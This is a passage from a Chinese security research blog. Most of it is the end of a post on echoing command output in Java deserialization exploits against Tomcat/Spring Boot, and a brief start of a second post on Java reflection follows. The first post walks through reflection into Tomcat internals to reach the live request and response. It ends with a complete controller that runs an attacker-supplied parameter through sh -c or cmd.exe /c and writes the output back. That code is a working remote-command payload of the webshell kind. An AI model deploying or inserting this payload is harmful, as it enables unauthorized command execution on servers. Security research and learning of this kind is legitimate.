<p>​        我们有两种方式可以获取到webappClassLoader，一种是通过<code>Class.forName(&quot;webappClassLoader&quot;).getClassLoader()</code>,一种是通过<code>Thread.currentThread().getContextClassLoader()</code>来获取，我们对比一下这两种方式获取的ClassLoader有什么不同。<code>Thread.currentThread().getContextClassLoader()</code>是获取当前线程的类加载器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Thread.currentThread().getContextClassLoader());     System.out.println(Class.forName(<span class="string">"org.apache.catalina.loader.WebappClassLoaderBase"</span>).getClassLoader());</span><br></pre></td></tr></table></figure>

<p>​        运行后我们可以看到通过Thread类获取的ClassLoader是TomcatEmbeddedWebappClassLoader类型的，而通过forName获取的是AppClassLoader类型，因此我们要获取WebappClassLoader，需要使用Thread来获取。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223170437936.png" alt="image-20201223170437936"></p>
<p>​        所以我们可以通过如下代码获取到TomcatEmbeddedWebappClassLoader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure>

<p>​        而TomcatEmbeddedWebappClassLoader是WebappClassLoaderBase的子类，也就是说这个TomcatEmbeddedWebappClassLoader本质上也是调用了tomcat自己实现的类加载器WebappClassLoaderBase来实现类加载的。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223171242354.png" alt="image-20201223171242354"></p>
<p>​    获取TomcatEmbeddedWebappClassLoader后，我们可以通过这个ClassLoader获取Context对象，再通过Context获取到applicationContext,也就可以获取到service对象了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">           java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">           contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223173018910.png" alt="image-20201223173018910"></p>
<p>​        通过下面的代码获取application的service</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line"></span><br><span class="line">serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p>​        获取到service后，通过service的findConnectors方法获取Connector。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223174205164.png" alt="image-20201223174205164"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br></pre></td></tr></table></figure>

<p>​        遍历connectors，通过connector的getProtocolHandler方法获取protocolHandler,再通过protocolHandler的getHandler获取connectoinHandler。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"> org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175015493.png" alt="image-20201223175015493"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223175429390.png" alt="image-20201223175429390"></p>
<p>​        下面需要从ConnectionHandler中取出global中的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line"></span><br><span class="line">globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br></pre></td></tr></table></figure>

<p>​        再从global中取出processors对象，里面包含了RequestInfo数组</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223180014242.png" alt="image-20201223180014242"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br></pre></td></tr></table></figure>

<p>​        由于获取到的Processors是一个ArrayList列表，所以我们需要遍历这个列表出去RequestInfo对象，获取到RequestInfo对象后需要判断当前的RequestInfo是否为我们本次请求的。可以通过是否包含我们需要的参数来进行判断。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestInfo.getCurrentQueryString().contains(<span class="string">"xxxx"</span>)</span><br></pre></td></tr></table></figure>

<p>​        跟进getCurrentQueryString，调用this.req.queryString方法，在queryString中返回我们传入的参数和内容。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181123439.png" alt="image-20201223181123439"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181134400.png" alt="image-20201223181134400"></p>
<p>​        找到我们本次请求的requestInfo后，我们需要获取request对象，而requestInfo.req属性中保存了当前的request对象，所以我们只要通过反射调用获取到req属性的内容即可。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223181335226.png" alt="image-20201223181335226"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);  <span class="comment">//获取request对象，这个对象是coyote类型的，和我们平时使用的Request不太一样</span></span><br><span class="line">org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>); <span class="comment">//通过getNote方法获取org.apache.catalina.connector.Request对象</span></span><br></pre></td></tr></table></figure>

<p>​            在request中保存的对象为coyote.request类型</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200125355.png" alt="image-20201223200125355"></p>
<p>​            通过request.getNote获取org.apache.catalina.connector.Request对象</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223200553783.png" alt="image-20201223200553783"></p>
<p>​            在org.apache.catalina.connector.Request中可以获取HttpServletRequest和HttpServletResponse对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201314166.png" alt="image-20201223201314166"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201223201323147.png" alt="image-20201223201323147"></p>
<p>​        最后我们获取request对象，并获取我们要执行的命令，再获取response对象，将命令执行的结果写入到Response对象中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String cmd =request.getParameter(pass);</span><br><span class="line">String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">writer.write(output);</span><br><span class="line">writer.flush();</span><br></pre></td></tr></table></figure>

<p>​        整个过程分析结束了，最后给出spring-boot下的完整代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">index</span><span class="params">(String input,HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//传递命令的参数名</span></span><br><span class="line">            String pass=<span class="string">"cmd12138"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//WebappClassLoaderBase</span></span><br><span class="line">            org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader webappClassLoaderBase =(org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="comment">//ApplicationContext</span></span><br><span class="line">            org.apache.catalina.Context context=webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");</span><br><span class="line">            contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//StandardService</span></span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");</span><br><span class="line">            serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Connector</span></span><br><span class="line">            org.apache.catalina.connector.Connector connectors[]=standardService.findConnectors();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//筛选Connector</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;connectors.length;i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (connectors[i].getScheme().contains(<span class="string">"http"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//AbstractProtocol$ConnectoinHandler</span></span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectoinHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//RequestGroupInfo</span></span><br><span class="line">                    java.lang.reflect.Field globalField = Class.forName(<span class="string">"org.apache.coyote.AbstractProtocol$ConnectionHandler"</span>).getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectoinHandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取RequestGroupInfo中储存了RequestInfo的processors</span></span><br><span class="line">                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");</span><br><span class="line">                    processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//通过QueryString筛选</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; list.size(); k++) &#123;</span><br><span class="line">                        org.apache.coyote.RequestInfo requestInfo= (org.apache.coyote.RequestInfo) list.get(k);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo.getCurrentQueryString().contains(pass))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//request</span></span><br><span class="line">                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");</span><br><span class="line">                            requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line">                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">//执行命令并回显</span></span><br><span class="line">                            String cmd =request.getParameter(pass);</span><br><span class="line">                            String[] cmds = !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>) ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                            String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">                            java.io.Writer writer = request.getResponse().getWriter();</span><br><span class="line">                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(<span class="string">"usingWriter"</span>);</span><br><span class="line">                            usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                            usingWriter.set(request.getResponse(), Boolean.FALSE);</span><br><span class="line">                            writer.write(output);</span><br><span class="line">                            writer.flush();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        目前分析的这些回显方案总的来讲分为如下两种思路</p>
<ul>
<li>通过defineClass类似的方法加载远程或者本地的字节码执行命令，并将命令执行的结果通过异常显示。</li>
<li>通过某种方法获取请求的响应包，将命令执行的结果写入到响应包中。</li>
</ul>
<p>​        在本次了解JAVA反序列化回显方案中，还是发现了很多知识点的不清晰，深深感到自己知识功底不扎实，Linux和Windows的回显方案也依赖对于Socket的理解上，Tomcat的回显又依赖于对tomcat源码的了解上，如果没有这些基础，是很难自己挖掘到这种回显方法的。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/#%E8%8E%B7%E5%8F%96Tomcat-Response" target="_blank" rel="noopener">java Web代码执行漏洞回显总结</a></p>
<p><a href="https://github.com/feihong-cs/Java-Rce-Echo" target="_blank" rel="noopener">Java RCE 回显</a></p>
<p><a href="https://xz.aliyun.com/t/7740#toc-4" target="_blank" rel="noopener">Java 反序列化回显的多种姿势</a></p>
<p><a href="https://xz.aliyun.com/t/7388#toc-1" target="_blank" rel="noopener">基于tomcat的内存 Webshell 无文件攻击技术</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" target="_blank" rel="noopener">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>
<p><a href="https://xz.aliyun.com/t/7228" target="_blank" rel="noopener">Weblogic使用ClassLoader和RMI来回显命令执行结果</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反射机制学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-02 14:04:35" itemprop="dateCreated datePublished" datetime="2020-12-02T14:04:35+08:00">2020-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 10:04:35" itemprop="dateModified" datetime="2020-12-24T10:04:35+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我们了解或者分析JAVA的反序列化漏洞时，一定绕过不过一个知识点，那就是JAVA的反射调用，所以这次我们专门写一篇文章和大家学习和了解一下JAVA的反射调用。</span><br></pre></td></tr></table></figure>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><h3 id="为什么要引入反射机制？"><a href="#为什么要引入反射机制？" class="headerlink" title="为什么要引入反射机制？"></a>为什么要引入反射机制？</h3><p>​        我们在编写程序时会有两种情况，第一种是我们明确知道编译时要使用的类和需要调用的方法的具体信息，这种情况下我们可以使用<code>new xxx()</code>来创建对象并使用。第二种是我们在编译的过程种不知道类或者对象的具体情况，只能通过程序运行时通过动态加载来判断。 比如类的名称和需要调用的属性放在配置文件中，这种配置方式降低了耦合性，我们在写JAVA WEB的过程中经常会遇到。</p>
<p>​        对于第二种方式，我们就无法在编译时得知我们要使用的类的类型和调用的方法，所以引入了反射机制。</p>
<h3 id="什么是JAVA的反射机制？"><a href="#什么是JAVA的反射机制？" class="headerlink" title="什么是JAVA的反射机制？"></a>什么是JAVA的反射机制？</h3><p>​        通过JAVA的反射机制，我们可以在<code>运行时</code>动态的获取到需要调用的类的属性和方法，对于任意对象，也能调用其相应的方法和设置相应的属性，这种动态获取信息和调用方法的属性叫做JAVA的反射机制。</p>
<p>​        通过JAVA的反射机制，我们可以做到如下功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在运行时判断任意一个对象所属的类；</span><br><span class="line">在运行时构造任意一个类的对象；</span><br><span class="line">在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</span><br><span class="line">在运行时调用任意一个对象的方法</span><br></pre></td></tr></table></figure>

<h3 id="如何使用JAVA的反射机制？"><a href="#如何使用JAVA的反射机制？" class="headerlink" title="如何使用JAVA的反射机制？"></a>如何使用JAVA的反射机制？</h3><h4 id="JAVA类的加载机制"><a href="#JAVA类的加载机制" class="headerlink" title="JAVA类的加载机制"></a>JAVA类的加载机制</h4><p>​        要理解JAVA的反射机制，我们肯定避不开JAVA类的一个加载机制。</p>
<p>​        我们知道如果我们需要使用JAVA开发的程序，就需要安装JDK，也就是说如果没有JDK，我们使用的WINDOQWS默认是无法运行JAVA生成的CLASS文件的，其中JDK就默认带有JAVA虚拟机（JVM）,这个JVM就是充当我们我们的JAVA程序和WINDOWS操作系统中间的角色，将我们编译的JAVA程序解释给WINDOWS操作系统运行。</p>
<p>​        当我们通过JAVA命令执行某个程序，该命令将会启动一个JVM，这个程序的所有线程、变量都会放在同一个JVM中运行。</p>
<p>​        当我们的程序需要使用某个类时，如果这个类还没有被加载到内存中，JVM虚拟机会将CLASS文件读入到内存，并对数据进行<strong>校验</strong>、<strong>转换解析</strong>和<strong>初始化</strong>，最终形成可被<strong>虚拟机</strong>直接使用的<code>Java</code>类型的过程。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/171ce88f75d21ba3" alt="Java 执行流程"></p>
<p>​    一般类的加载分为3个阶段：加载、连接、初始化。</p>
<h5 id="类的加载器"><a href="#类的加载器" class="headerlink" title="类的加载器"></a>类的加载器</h5><p>​        <strong>类加载器的加载过程</strong></p>
<ul>
<li>通过一个类的全限定名称来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在java堆中生成一个代表这个类的java.lang.Class对象，作为方法区这些数据的访问入口</li>
</ul>
<p>​        <strong>类的加载器的加载方式</strong></p>
<ul>
<li><p>从本地文件系统加载CLASS文件</p>
</li>
